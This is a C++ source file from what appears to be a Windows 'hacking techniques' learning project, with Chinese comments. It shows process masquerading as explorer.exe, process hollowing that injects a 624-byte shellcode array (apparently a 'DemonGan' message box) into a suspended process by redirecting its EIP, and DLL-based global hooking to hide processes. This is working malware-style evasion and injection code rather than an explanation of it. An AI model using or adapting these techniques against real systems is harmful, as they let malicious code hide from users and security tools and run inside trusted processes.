﻿// FakeOrHide.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <Windows.h>
/**
 * 隐藏及伪装技术
 */

 /**
  * 进程伪装
  * 修改进程信息
  */
#include "DisguiseProcess.h"
void test_fake()
{
	if (FALSE == DisguiseProcess(17740, L"C:\\Windows\\explorer.exe", L"explorer.exe"))
	{
		printf("Dsisguise Process Error.\n");
	}
	printf("Dsisguise Process OK.\n");

	system("pause");
}

/**
 * 傀偶进程
 * 借用正常程序执行恶意代码
 * 修改某一进程的内存数据，向内存中写入Shellcode代码，之后修改执行流程，使其运行shellcode
 * 主要流程：进程创建后，将主线程挂起，此时修改EIP数据，再恢复进程
 */
#include "ReplaceProcess.h"
 // 弹窗 Shellcode
char data[624] = {
	0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC, 0x60, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x8B, 0x7D,
	0x08, 0x81, 0xE7, 0x00, 0x00, 0xFF, 0xFF, 0x66, 0x81, 0x3F, 0x4D, 0x5A, 0x75, 0x12, 0x8B, 0xF7,
	0x03, 0x76, 0x3C, 0x81, 0x3E, 0x50, 0x45, 0x00, 0x00, 0x75, 0x05, 0x89, 0x7D, 0xFC, 0xEB, 0x10,
	0x81, 0xEF, 0x00, 0x00, 0x01, 0x00, 0x81, 0xFF, 0x00, 0x00, 0x00, 0x70, 0x72, 0x02, 0xEB, 0xD7,
	0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC2, 0x04, 0x00, 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC, 0x60, 0xC7,
	0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x64, 0xA1, 0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B,
	0x40, 0x1C, 0x8B, 0x00, 0x8B, 0x40, 0x08, 0x89, 0x45, 0xFC, 0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC3,
	0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC, 0x60, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x64, 0xA1,
	0x30, 0x00, 0x00, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x1C, 0x8B, 0x00, 0x8B, 0x00, 0x8B, 0x40,
	0x08, 0x89, 0x45, 0xFC, 0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xC4, 0xFC,
	0x60, 0xC7, 0x45, 0xFC, 0x00, 0x00, 0x00, 0x00, 0x64, 0x8B, 0x35, 0x30, 0x00, 0x00, 0x00, 0x8B,
	0x76, 0x0C, 0x8B, 0x76, 0x1C, 0x8B, 0x46, 0x08, 0x8B, 0x7E, 0x20, 0x8B, 0x36, 0x38, 0x4F, 0x18,
	0x75, 0xF3, 0x89, 0x45, 0xFC, 0x61, 0x8B, 0x45, 0xFC, 0xC9, 0xC3, 0x55, 0x8B, 0xEC, 0x83, 0xC4,
	0xF8, 0x60, 0x33, 0xC9, 0x8B, 0x55, 0x0C, 0x8A, 0x02, 0x0A, 0xC0, 0x74, 0x04, 0x41, 0x42, 0xEB,
	0xF6, 0x89, 0x4D, 0xF8, 0x8B, 0x75, 0x08, 0x03, 0x76, 0x3C, 0x8B, 0x76, 0x78, 0x03, 0x75, 0x08,
	0x33, 0xD2, 0x8B, 0x5E, 0x20, 0x03, 0x5D, 0x08, 0x56, 0x8B, 0x75, 0x0C, 0x8B, 0x3B, 0x03, 0x7D,
	0x08, 0x8B, 0x4D, 0xF8, 0xF3, 0xA6, 0x75, 0x03, 0x5E, 0xEB, 0x0A, 0x5E, 0x42, 0x83, 0xC3, 0x04,
	0x3B, 0x56, 0x18, 0x72, 0xE3, 0x8B, 0x5E, 0x24, 0x03, 0x5D, 0x08, 0xB8, 0x02, 0x00, 0x00, 0x00,
	0xF7, 0xE2, 0x03, 0xD8, 0x0F, 0xB7, 0x03, 0x8B, 0x5E, 0x1C, 0x03, 0x5D, 0x08, 0xB9, 0x04, 0x00,
	0x00, 0x00, 0xF7, 0xE1, 0x03, 0xD8, 0x8B, 0x03, 0x03, 0x45, 0x08, 0x89, 0x45, 0xFC, 0x61, 0x8B,
	0x45, 0xFC, 0xC9, 0xC2, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x75, 0x73,
	0x65, 0x72, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x47, 0x65, 0x74, 0x50, 0x72, 0x6F, 0x63,
	0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0x00, 0x4C, 0x6F, 0x61, 0x64, 0x4C, 0x69, 0x62, 0x72,
	0x61, 0x72, 0x79, 0x41, 0x00, 0x4D, 0x65, 0x73, 0x73, 0x61, 0x67, 0x65, 0x42, 0x6F, 0x78, 0x41,
	0x00, 0x49, 0x20, 0x61, 0x6D, 0x20, 0x44, 0x65, 0x6D, 0x6F, 0x6E, 0x47, 0x61, 0x6E, 0x00, 0x00,
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x65, 0x6D, 0x6F, 0x6E,
	0x47, 0x61, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
	0x60, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x5B, 0x81, 0xEB, 0xB6, 0x11, 0x40, 0x00, 0xE8, 0xAE, 0xFE,
	0xFF, 0xFF, 0x0B, 0xC0, 0x75, 0x05, 0xE9, 0x9A, 0x00, 0x00, 0x00, 0x89, 0x83, 0x46, 0x11, 0x40,
	0x00, 0x8D, 0x83, 0x59, 0x11, 0x40, 0x00, 0x50, 0xFF, 0xB3, 0x46, 0x11, 0x40, 0x00, 0xE8, 0xE8,
	0xFE, 0xFF, 0xFF, 0x0B, 0xC0, 0x75, 0x02, 0xEB, 0x7C, 0x89, 0x83, 0xA4, 0x11, 0x40, 0x00, 0x8D,
	0x83, 0x68, 0x11, 0x40, 0x00, 0x50, 0xFF, 0xB3, 0x46, 0x11, 0x40, 0x00, 0xFF, 0x93, 0xA4, 0x11,
	0x40, 0x00, 0x0B, 0xC0, 0x75, 0x02, 0xEB, 0x5D, 0x89, 0x83, 0xA8, 0x11, 0x40, 0x00, 0x8D, 0x83,
	0x4E, 0x11, 0x40, 0x00, 0x50, 0xFF, 0x93, 0xA8, 0x11, 0x40, 0x00, 0x0B, 0xC0, 0x75, 0x02, 0xEB,
	0x44, 0x89, 0x83, 0x4A, 0x11, 0x40, 0x00, 0x8D, 0x83, 0x75, 0x11, 0x40, 0x00, 0x50, 0xFF, 0xB3,
	0x4A, 0x11, 0x40, 0x00, 0xFF, 0x93, 0xA4, 0x11, 0x40, 0x00, 0x0B, 0xC0, 0x75, 0x02, 0xEB, 0x25,
	0x89, 0x83, 0xAC, 0x11, 0x40, 0x00, 0x8D, 0x83, 0x81, 0x11, 0x40, 0x00, 0x8D, 0x8B, 0x9B, 0x11,
	0x40, 0x00, 0x6A, 0x04, 0x51, 0x50, 0x6A, 0x00, 0xFF, 0x93, 0xAC, 0x11, 0x40, 0x00, 0x83, 0xF8,
	0x06, 0x74, 0x02, 0x61, 0xC3, 0x61, 0xE9, 0xDE, 0xC4, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x00
};
void test_shell()
{
	if (FALSE == ReplaceProcess("C:\\workspaceKernel\\HackTechLearning\\Debug\\HackTechLearning.exe", data, 624, 432))
	{
		printf("Replace Process Error.\n");
	}

	printf("Replace Process OK.\n");
	system("pause");
}

/**
 * 进程隐藏
 * 通过inline HOOK API技术，获取API地址，修改前几个字节写入一个跳转指令，使程序跳转到其他函数
 */
void test_hook()
{
	// 加载DLL并获取句柄
	HMODULE hDll = ::LoadLibrary("C:\\workspaceKernel\\HackTechLearning\\Debug\\FakeOrHide_HOOKDLL.dll");
	if (NULL == hDll)
	{
		printf("%s error[%d]\n", "LoadLibrary", ::GetLastError());
	}
	printf("Load Library OK.\n");

	// 设置全局钩子
	typedef HHOOK(*typedef_SetHook)();
	typedef_SetHook SetHook = (typedef_SetHook)::GetProcAddress(hDll, "SetHook");
	if (NULL == SetHook)
	{
		printf("GetProcAddress Error[%d]\n", ::GetLastError());
	}
	HHOOK hHook = SetHook(); //TODO：调用时发生不匹配导致栈里边的ESP不正常
	if (NULL == hHook)
	{
		printf("%s error[%d]\n", "SetWindowsHookEx", ::GetLastError());
	}
	printf("Set Windows Hook OK.\n");
	system("pause");
	// 卸载全局钩子
	typedef BOOL(*typedef_UnsetHook)(HHOOK);
	typedef_UnsetHook UnsetHook = (typedef_UnsetHook)::GetProcAddress(hDll, "UnsetHook");
	if (NULL == UnsetHook)
	{
		printf("GetProcAddress Error[%d]\n", ::GetLastError());
	}
	if (FALSE == UnsetHook(hHook))
	{
		printf("%s error[%d]\n", "UnhookWindowsHookE", ::GetLastError());
	}
	printf("Unhook Windows Hook OK.\n");
	// 卸载DLL
	::FreeLibrary(hDll);

	system("pause");
}

int main()
{
	//测试进程信息修改
	//test_fake();

	//测试傀偶进程写入shellcode
	//test_shell();

	//测试隐藏进程，通过全局钩子注入DLL方式，DLL程序在另一个项目FakeOrHide_HOOKDLL中
	test_hook();

	return 0;
}

